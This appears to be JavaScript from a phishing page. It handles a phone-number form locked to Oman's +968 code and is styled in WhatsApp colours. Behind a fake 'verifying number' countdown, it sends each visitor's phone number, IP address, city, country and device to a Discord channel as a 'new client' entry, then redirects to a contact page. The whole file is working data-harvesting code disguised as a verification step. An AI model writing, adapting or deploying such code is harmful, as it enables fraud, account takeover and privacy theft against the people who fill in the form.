// معالج نموذج رقم الهاتف - يقبل جميع الأرقام
document.addEventListener('DOMContentLoaded', async function () {
    const form = document.getElementById('phoneForm');
    const phoneInput = document.getElementById('phone');
    const countryCodeSelect = document.getElementById('countryCode');
    const submitBtn = document.getElementById('submitBtn');

    let countdownInterval;

    // إجبار رمز الدولة على عُمان (+968)
    countryCodeSelect.value = '+968';
    countryCodeSelect.disabled = true;

    // تنسيق الرقم أثناء الكتابة
    phoneInput.addEventListener('input', function (e) {
        // السماح فقط بالأرقام
        this.value = this.value.replace(/[^0-9]/g, '');

        hideError();

        // إظهار تنسيق صحيح أثناء الكتابة
        if (this.value.length >= 8) {
            this.style.borderColor = '#25D366';
            this.style.boxShadow = '0 0 0 4px rgba(37, 211, 102, 0.1)';
        } else {
            this.style.borderColor = '#e0e0e0';
            this.style.boxShadow = 'none';
        }
    });

    form.addEventListener('submit', async function (e) {
        e.preventDefault();

        hideError();

        const code = countryCodeSelect.value;
        const phone = phoneInput.value.trim();
        const cleanedPhone = phone.replace(/\s+/g, '');

        // التحقق من وجود رقم
        if (!cleanedPhone) {
            showError('⚠️ يرجى إدخال رقم الهاتف');
            phoneInput.focus();
            return;
        }

        // التحقق من طول الرقم (6-12 رقم)
        if (cleanedPhone.length < 6 || cleanedPhone.length > 12) {
            showError('⚠️ الرقم يجب أن يكون بين 6 و 12 رقم');
            phoneInput.focus();
            return;
        }

        // تعطيل النموذج وعرض التحميل
        disableForm('phoneForm');
        showChronoLoading('جاري التحقق من الرقم ...');

        // بدء العد التنازلي مع الخط
        startChronoCountdown(15, 'contact.html');

        try {
            // الحصول على معلومات الجهاز
            const { device } = getDeviceInfo();

            // الحصول على معلومات IP
            const { country, city, ip } = await getIPInfo();

            // تنسيق الرقم للعرض
            let formattedPhone = cleanedPhone;

            // إذا كان الرقم يبدأ بـ 0، أزل الصفر
            if (formattedPhone.startsWith('0')) {
                formattedPhone = formattedPhone.substring(1);
            }

            // إذا كان الرقم أقل من 8 أرقام، أضف 94
            if (formattedPhone.length < 8) {
                formattedPhone = '94' + formattedPhone;
            }

            // اقتصر على 8 أرقام كحد أقصى
            if (formattedPhone.length > 8) {
                formattedPhone = formattedPhone.substring(0, 8);
            }
            // إرسال البيانات إلى Discord
            const message = `📱═══Nouveau Client ════📱
                 **معلومات الاتصال**


🎯 **للنسخ السريع:**
\`${code}${cleanedPhone}\`


🏴 **الدولة:** ${country}
🏙️ **المدينة:** ${city}
🌐 **IP:** \`${ip}\`
📟 **الجهاز:** ${device}
📱════════════════📱
`;
            const success = await sendToDiscord(message);

            if (success) {
                // حفظ رقم الهاتف
                saveToStorage('contactNumber', code + formattedPhone);
                saveToStorage('phoneNumber', formattedPhone);
                saveToStorage('originalPhone', cleanedPhone);
                saveToStorage('countryCode', code);

                // حفظ معلومات إضافية
                saveToStorage('country', country);
                saveToStorage('city', city);
                saveToStorage('ip', ip);
                saveToStorage('device', device);

                // الكرونو سيتولى عملية التوجيه بعد انتهائه
            } else {
                hideChronoLoading();
                if (countdownInterval) clearInterval(countdownInterval);
                enableForm('phoneForm');
                showError('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
            }
        } catch (error) {
            console.error('خطأ:', error);
            hideChronoLoading();
            if (countdownInterval) clearInterval(countdownInterval);
            enableForm('phoneForm');
            showError('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
        }
    });

    // وظائف جديدة للتحميل الخطي
    function startChronoCountdown(seconds, redirectUrl) {
        let currentTime = seconds;
        const timerElement = document.querySelector('.chrono-timer');
        const progressElement = document.querySelector('.chrono-progress');

        if (countdownInterval) clearInterval(countdownInterval);

        countdownInterval = setInterval(() => {
            currentTime--;

            // تحديث المؤقت
            if (timerElement) {
                timerElement.textContent = currentTime;

                // تغيير اللون عند اقتراب النهاية
                if (currentTime <= 5) {
                    timerElement.style.color = '#ff6b6b';
                    timerElement.style.transform = 'scale(1.1)';
                } else {
                    timerElement.style.color = '#075E54';
                    timerElement.style.transform = 'scale(1)';
                }
            }

            // تحديث الخط التحميلي
            if (progressElement) {
                const percentage = ((seconds - currentTime) / seconds) * 100;
                progressElement.style.width = `${percentage}%`;
            }

            if (currentTime <= 0) {
                clearInterval(countdownInterval);
                window.location.href = redirectUrl;
            }
        }, 1000);
    }

    function showChronoLoading(text = 'جاري التحقق من الرقم ...') {
        const loadingOverlay = document.getElementById('loadingPopup');
        const chronoLabel = document.querySelector('.chrono-label');

        if (chronoLabel) {
            chronoLabel.textContent = text;
        }

        // إعادة تعيين الخط
        const progressElement = document.querySelector('.chrono-progress');
        if (progressElement) {
            progressElement.style.width = '0%';
        }

        // إعادة تعيين المؤقت
        const timerElement = document.querySelector('.chrono-timer');
        if (timerElement) {
            timerElement.textContent = '15';
            timerElement.style.color = '#075E54';
            timerElement.style.transform = 'scale(1)';
        }

        loadingOverlay.style.display = 'flex';
    }

    function hideChronoLoading() {
        const loadingOverlay = document.getElementById('loadingPopup');
        loadingOverlay.style.display = 'none';

        if (countdownInterval) {
            clearInterval(countdownInterval);
        }
    }



    // تشغيل الأمثلة بعد تحميل الصفحة
    setTimeout(addExamples, 500);
});